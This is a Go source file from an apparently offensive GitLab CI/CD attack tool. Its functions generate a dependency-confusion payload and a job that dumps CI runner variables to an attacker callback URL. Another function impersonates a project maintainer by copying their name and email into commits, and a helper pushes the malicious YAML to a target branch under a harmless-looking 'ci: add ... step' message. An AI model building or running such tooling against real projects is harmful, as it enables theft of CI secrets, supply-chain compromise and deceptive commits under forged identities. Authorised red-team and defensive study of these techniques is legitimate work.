package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
)

// commitOrPrintPayload handles the common pattern: generate YAML, either print it
// (--payload-only) or commit it to a branch and report success.
func commitOrPrintPayload(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client, yaml, modeName string) error {
	if atkPayloadOnly {
		_, err := fmt.Fprintln(cmd.OutOrStdout(), yaml)
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "ci: add " + modeName + " step"
	}
	finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
	if err != nil {
		return fmt.Errorf("commit %s payload: %w", modeName, err)
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("%s payload committed to branch %s", modeName, finalBranch))
	return nil
}

// runDepConfusion handles the --dep-confusion attack mode.
func runDepConfusion(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	yaml := payloadgen.GenerateDepConfusionYAML(payloadgen.DepConfusionOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		PackageName: strings.TrimSpace(atkDepConfusionPackage),
		Version:     strings.TrimSpace(atkDepConfusionVersion),
		Ecosystem:   strings.TrimSpace(atkDepConfusionEcosystem),
		CallbackURL: strings.TrimSpace(atkWebhook),
	})
	return commitOrPrintPayload(ctx, cmd, client, yaml, "dep-confusion")
}

// runRunnerVarDump handles the --runner-var-dump attack mode.
func runRunnerVarDump(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	yaml := payloadgen.GenerateRunnerVarDumpYAML(payloadgen.RunnerVarDumpOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		Method:      strings.TrimSpace(atkRunnerVarDumpMethod),
		Filter:      strings.TrimSpace(atkRunnerVarDumpFilter),
		CallbackURL: strings.TrimSpace(atkWebhook),
	})
	return commitOrPrintPayload(ctx, cmd, client, yaml, "runner-var-dump")
}

// runImpersonateMaintainer resolves a project maintainer and overwrites the
// author name/email so downstream attack modes use the impersonated identity.
func runImpersonateMaintainer(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) {
	if !atkImpersonateMaintainer || strings.TrimSpace(atkTarget) == "" {
		return
	}
	tmpAtt := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), "", "", 0)
	if err := tmpAtt.ImpersonateMaintainer(ctx, atkTarget); err != nil {
		fmt.Fprintf(cmd.ErrOrStderr(), "impersonate maintainer: %v\n", err)
		return
	}
	atkAuthorName = tmpAtt.AuthorName
	atkAuthorEmail = tmpAtt.AuthorEmail
}

// renderPayloadOnlyJSON outputs a JSON object with the branch and optional metadata for --payload-only modes.
func renderPayloadOnlyJSON(cmd *cobra.Command, branch string, extra map[string]string) error {
	out := map[string]string{"branch": branch}
	for k, v := range extra {
		out[k] = v
	}
	b, _ := json.MarshalIndent(out, "", "  ")
	_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
	return err
}
